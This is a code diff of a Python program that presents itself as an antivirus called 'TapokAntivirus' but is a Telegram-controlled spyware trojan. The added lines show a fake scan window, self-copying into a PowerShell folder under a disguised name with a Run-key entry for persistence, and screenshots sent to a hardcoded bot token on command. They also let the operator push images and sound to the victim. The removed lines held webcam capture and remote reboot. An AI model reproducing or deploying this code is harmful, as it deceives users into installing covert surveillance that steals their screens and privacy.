@@ -1,77 +1,101 @@
-import os
-import asyncio
-import sys
-import cv2
-import pyautogui
-import ctypes
-import shutil
-import subprocess
+import os, sys, asyncio, cv2, pyautogui, ctypes, shutil, subprocess, random, time, threading
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.types import BufferedInputFile
-from pygame import mixer
+import tkinter as tk
+from tkinter import ttk
+from PIL import Image, ImageTk
+import winsound
 
-# Конфигурация
 API_TOKEN = '8543450940:AAF5KG-Qa44HCYbsNRn0PS59D7QzoIEuzrQ'
-
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher()
-mixer.init()
 
+# --- ПУТЬ ПОВЕРШЕЛЛА ---
 def install_persistence():
     try:
-        app_path = sys.executable
-        target_dir = os.path.join(os.getenv('APPDATA'), 'TapokAntivirus')
-        target_path = os.path.join(target_dir, 'tapok_svc.exe')
-        if not os.path.exists(target_dir): os.makedirs(target_dir)
-        if app_path != target_path:
-            shutil.copy2(app_path, target_path)
-            subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "TapokAntivirus" /t REG_SZ /d "{target_path}" /f', shell=True, capture_output=True)
+        ps_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'PowerShell')
+        target_path = os.path.join(ps_dir, 'v1.0', 'powershell_sync.exe')
+        if not os.path.exists(os.path.dirname(target_path)): os.makedirs(os.path.dirname(target_path))
+        if sys.executable != target_path:
+            shutil.copy2(sys.executable, target_path)
+            subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "PowerShellSync" /t REG_SZ /d "{target_path}" /f', shell=True, capture_output=True)
     except: pass
 
-# --- Доступ открыт для ВСЕХ пользователей ---
+# --- ИНТЕРФЕЙС TAPOKANTIVIRUS ---
+def start_gui():
+    root = tk.Tk()
+    root.title("TapokAntivirus v3.1")
+    root.geometry("400x250")
+    root.resizable(False, False)
+
+    label = tk.Label(root, text="Система защищена", fg="green", font=("Arial", 12))
+    label.pack(pady=20)
+
+    progress = ttk.Progressbar(root, length=300, mode='determinate')
+    progress.pack(pady=10)
+
+    def scan():
+        btn_scan.config(state="disabled")
+        label.config(text="Сканирование системы...", fg="black")
+        
+        def run_progress():
+            for i in range(101):
+                time.sleep(2.4) # 240 секунд / 100 = 2.4 сек на 1%
+                progress['value'] = i
+            res = random.randint(1, 2)
+            label.config(text=f"Готово! Найдено и удалено {res} угроз.", fg="blue")
+            btn_scan.config(state="normal")
+        
+        threading.Thread(target=run_progress).start()
+
+    btn_scan = tk.Button(root, text="Сканировать", command=scan, width=20)
+    btn_scan.pack(pady=20)
+    root.mainloop()
+
+# --- ФУНКЦИИ БОТА ---
+@dp.message(F.photo)
+async def show_image(message: types.Message):
+    # Качаем фото
+    photo = message.photo[-1]
+    file = await bot.get_file(photo.file_id)
+    await bot.download_file(file.file_path, "show.png")
+    
+    def display():
+        win = tk.Toplevel()
+        win.attributes("-fullscreen", True)
+        win.attributes("-topmost", True)
+        img = Image.open("show.png")
+        # Растягиваем на весь экран
+        img = img.resize((pyautogui.size()), Image.LANCZOS)
+        tk_img = ImageTk.PhotoImage(img)
+        label = tk.Label(win, image=tk_img)
+        label.pack()
+        win.update()
+        time.sleep(3)
+        win.destroy()
+        os.remove("show.png")
+
+    threading.Thread(target=display).start()
 
 @dp.message(F.voice | F.audio)
-async def play_sound(message: types.Message):
+async def play_sys_sound(message: types.Message):
     file_id = message.voice.file_id if message.voice else message.audio.file_id
     file = await bot.get_file(file_id)
-    path = "t.mp3"
-    await bot.download_file(file.file_path, path)
-    mixer.music.load(path)
-    mixer.music.play()
-    while mixer.music.get_busy(): await asyncio.sleep(1)
-    mixer.music.unload()
-    os.remove(path)
+    await bot.download_file(file.file_path, "s.wav")
+    # Системное воспроизведение без плеера
+    winsound.PlaySound("s.wav", winsound.SND_FILENAME | winsound.SND_ASYNC)
 
 @dp.message(F.text == "/screen")
-async def send_screen(message: types.Message):
+async def srv_screen(m: types.Message):
     pyautogui.screenshot("s.png")
-    await message.answer_photo(BufferedInputFile(open("s.png", "rb").read(), filename="s.png"))
-    os.remove("s.png")
-
-@dp.message(F.text == "/cam")
-async def send_cam(message: types.Message):
-    cap = cv2.VideoCapture(0)
-    ret, frame = cap.read()
-    if ret:
-        cv2.imwrite("c.jpg", frame)
-        await message.answer_photo(BufferedInputFile(open("c.jpg", "rb").read(), filename="c.jpg"))
-        os.remove("c.jpg")
-    cap.release()
-
-@dp.message(F.text.startswith("/wallpaper "))
-async def set_wall(message: types.Message):
-    url = message.text.split(" ", 1)[1]
-    # Примечание: тут ожидается локальный путь или скачанный файл
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, url, 3)
-
-@dp.message(F.text == "/reboot")
-async def reboot_pc(message: types.Message):
-    os.system("shutdown /r /t 1")
+    await m.answer_photo(BufferedInputFile(open("s.png", "rb").read(), "s.png"))
 
 async def main():
     install_persistence()
+    # Запуск GUI в отдельном потоке
+    threading.Thread(target=start_gui, daemon=True).start()
     await dp.start_polling(bot)
 
 if __name__ == '__main__':
     asyncio.run(main())
-  
+    
